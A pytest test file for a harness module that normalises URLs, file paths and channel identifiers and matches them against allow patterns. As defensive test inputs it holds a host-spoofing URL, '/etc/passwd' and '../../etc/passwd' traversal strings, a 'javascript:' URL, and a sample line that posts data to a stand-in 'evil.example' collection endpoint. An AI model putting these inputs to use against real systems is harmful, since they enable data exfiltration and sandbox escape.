import pytest

from cam_live.harness.auth import destinations as D


@pytest.mark.parametrize("a,b", [
    ("HTTP://WWW.Example.COM:80/a/../b/?q=1#frag", "http://www.example.com/b"),
    ("https://example.com:443/x/", "https://example.com/x"),
    ("example.com/%7Euser", "https://example.com/~user"),
    ("http://2130706433:8765/", "http://127.0.0.1:8765/"),
    ("http://0x7f.0.0.1/", "http://127.0.0.1/"),
    ("http://EXAMPLE.com./p//q", "http://example.com/p/q"),
])
def test_cosmetic_url_variants_share_a_key(a, b):
    assert D.normalise_url(a).key == D.normalise_url(b).key


def test_userinfo_does_not_hide_the_real_host():
    d = D.normalise_url("https://owned.example@evil.example/path")
    assert d.host == "evil.example"
    assert not D.parse_pattern("owned.example").matches(d)


def test_intent_key_ignores_www_port_and_path():
    keys = {D.normalise_url(u).intent_key for u in ("https://www.site.example/a", "http://site.example:8080/b?x",
                                                    "SITE.example")}
    assert keys == {"url:site.example"}


@pytest.mark.parametrize("bad", ["", "javascript:alert(1)", "file:///etc/passwd", "http://exa mple.com", "http://",
                                 "gopher://x.example/", "http://bad_host!/"])
def test_unusable_urls_are_rejected(bad):
    with pytest.raises(D.DestinationError):
        D.normalise_url(bad)


def test_url_patterns():
    d = D.normalise_url("https://a.docs.example/guide/intro")
    assert D.parse_pattern("*.docs.example").matches(d)
    assert not D.parse_pattern("docs.example").matches(d)                 # exact host unless a wildcard is written
    assert D.parse_pattern("https://a.docs.example/guide/*").matches(d)
    assert not D.parse_pattern("https://a.docs.example/admin/*").matches(d)
    assert not D.parse_pattern("http://a.docs.example").matches(d)        # scheme named in the pattern must match
    assert D.parse_pattern("127.0.0.1:8765").matches(D.normalise_url("http://127.0.0.1:8765/x"))
    assert not D.parse_pattern("127.0.0.1:8765").matches(D.normalise_url("http://127.0.0.1:9999/x"))
    assert D.parse_pattern("127.0.0.1").matches(D.normalise_url("http://127.0.0.1:9999/x"))
    assert D.parse_pattern("*").matches(d)


def test_identity_and_file_patterns(tmp_path):
    ch = D.parse_destination("channel:discord:1234567", "url")
    assert ch.kind == "channel" and ch.key == "channel:discord:1234567"
    assert D.parse_pattern("channel:discord:*").matches(ch)
    assert not D.parse_pattern("channel:staging:*").matches(ch)
    assert not D.parse_pattern("account:discord:*").matches(ch)
    root = str(tmp_path / "sandbox")
    inside = D.normalise_file("out/report.txt", base=root)
    assert D.parse_pattern("file:" + root).matches(inside)
    assert not D.parse_pattern("file:" + root).matches(D.normalise_file("/etc/passwd"))
    with pytest.raises(D.DestinationError):
        D.normalise_file("../../etc/passwd", base=root)


@pytest.mark.parametrize("bad", ["", "channel:discord", "file:relative/path", "ftp+x://h", "host:port", "ex ample.com"])
def test_malformed_patterns_raise(bad):
    with pytest.raises(D.DestinationError):
        D.parse_pattern(bad)


def test_urls_in_text_and_needles():
    text = "import requests\nrequests.post('https://Evil.Example/collect', data=x)  # see http://docs.example/a."
    assert [d.host for d in D.urls_in_text(text)] == ["evil.example", "docs.example"]
    assert D.normalise_url("https://www.evil.example/x").needles() == ["evil.example"]
    assert D.parse_destination("channel:discord:123456789").needles() == ["123456789"]
